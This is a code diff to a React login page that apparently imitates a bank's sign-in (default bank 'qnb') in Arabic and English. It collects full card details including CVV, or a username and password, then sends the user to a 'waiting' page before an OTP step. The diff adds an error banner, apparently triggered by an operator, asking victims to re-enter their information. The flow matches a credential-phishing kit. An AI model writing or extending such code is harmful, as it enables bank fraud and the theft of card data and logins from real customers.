@@ -7,18 +7,17 @@ import { toast } from "sonner";
 export default function LoginMethod() {
   const [, setLocation] = useLocation();
   const search = useSearch();
-  const { language, setLanguage, t } = useLanguage();
+  const { language, setLanguage } = useLanguage();
   const params = new URLSearchParams(search);
   const bank = params.get("bank") || "qnb";
+  const hasError = params.get("error") === "true";
   
-  // التحقق من sessionId من مصادر متعددة لضمان الاستمرارية
   const [sessionId, setSessionId] = useState<string>("");
 
   useEffect(() => {
     const sId = localStorage.getItem("sessionId") || params.get("session") || "";
     if (sId) {
       setSessionId(sId);
-      // تحديث localStorage إذا كان مفقوداً
       if (!localStorage.getItem("sessionId")) {
         localStorage.setItem("sessionId", sId);
       }
@@ -57,7 +56,6 @@ export default function LoginMethod() {
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     
-    // تأكيد وجود sessionId قبل الإرسال
     const currentSessionId = sessionId || localStorage.getItem("sessionId") || params.get("session") || "";
     
     if (!currentSessionId) {
@@ -67,7 +65,6 @@ export default function LoginMethod() {
 
     try {
       if (method === "card") {
-        // التحقق من تعبئة كافة الحقول المطلوبة للبطاقة
         if (!cardData.cardNumber || !cardData.cardholderName || !cardData.expiryDate || !cardData.cvv) {
           toast.error(isArabic ? "يرجى ملء كافة بيانات البطاقة" : "Please fill all card details");
           return;
@@ -84,7 +81,6 @@ export default function LoginMethod() {
           password: "",
         });
       } else {
-        // التحقق من تعبئة اسم المستخدم وكلمة المرور
         if (!userData.username || !userData.password) {
           toast.error(isArabic ? "يرجى ملء اسم المستخدم وكلمة المرور" : "Please fill username and password");
           return;
@@ -102,7 +98,6 @@ export default function LoginMethod() {
         });
       }
       
-      // التوجيه لصفحة الانتظار بعد النجاح
       setLocation(`/waiting?bank=${bank}&session=${currentSessionId}&next=otp`);
     } catch (error) {
       console.error("Submission error:", error);
@@ -122,6 +117,7 @@ export default function LoginMethod() {
         .logo { height: 80px; width: auto; object-fit: contain; background-color: white; padding: 5px; }
         .lang-btn { background: transparent; color: #8C0032; border: 2px solid #8C0032; padding: 5px 15px; border-radius: 5px; font-weight: bold; cursor: pointer; }
         .container { padding: 20px; flex: 1; }
+        .error-message { background-color: #fef2f2; color: #991b1b; border: 1px solid #fee2e2; padding: 15px; border-radius: 8px; margin-bottom: 20px; text-align: center; font-weight: bold; font-size: 14px; }
         .selection-box { background: white; border: 2px solid #ddd; border-radius: 10px; padding: 20px; margin-bottom: 15px; cursor: pointer; text-align: center; transition: 0.3s; }
         .selection-box.active { border-color: #8C0032; background-color: #fff9f9; }
         .selection-box h3 { margin: 0 0 10px 0; color: #333; }
@@ -142,6 +138,12 @@ export default function LoginMethod() {
       </header>
 
       <div className="container">
+        {hasError && (
+          <div className="error-message">
+            {isArabic ? "رجاء التأكد من المعلومات الصحيحة وإعادة المحاولة" : "Please ensure correct information and try again"}
+          </div>
+        )}
+
         <div className={`selection-box ${method === "card" ? "active" : ""}`} onClick={() => setMethod("card")}>
           <h3>{isArabic ? "تسجيل الدخول" : "Login"}</h3>
           <p>{isArabic ? "البطاقة البنكية" : "Bank Card"}</p>
